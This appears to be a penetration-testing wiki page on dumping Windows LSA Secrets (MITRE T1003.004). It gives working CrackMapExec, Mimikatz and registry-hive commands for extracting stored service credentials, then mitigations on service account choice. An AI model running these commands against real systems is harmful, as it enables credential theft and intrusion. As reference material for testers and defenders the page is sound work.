---
description: MITRE ATT&CK, Credential Access, Sub-technique T1003.004
---

# LSA Secrets

### Dumping LSA Secrets

> LSA secrets are stored in the registry at `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets`. LSA secrets can also be dumped from memory.[\[4\]](https://ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsa-secrets)

```bash
# Dumping LSA Secrets remotely with CrackMapExec
crackmapexec smb $ip -u $user -p $password --lsa

# Dumping LSA Secrets with Mimikatz
lsadump::secrets

# Dumping LSA Secrets manually and then reading them with Mimikatz
reg save HKLM\SYSTEM system & reg save HKLM\security security
lsadump::secrets /system:c:\temp\system /security:c:\temp\security
```

### Mitigations

When cleartext credentials are retrieved from LSA Secrets it is due to the credentials being stored for a service (E.g., creating a service with a custom user account).

To mitigate this issue, avoid using a domain account for the service. Best practice is to avoid using a domain user account for services. Rather, create a local account to run the service. If specific domain user rights are needed then create an account with the _specific_ rights required. It should also be stated to **never** use a domain administrator account for a service.

### References

{% embed url="https://www.sentinelone.com/blog/windows-security-essentials-preventing-4-common-methods-of-credentials-exfiltration" %}

{% embed url="https://www.passcape.com/index.php?cmd=details&id=23&section=docsys" %}

{% embed url="https://attack.mitre.org/techniques/T1003/004/" %}
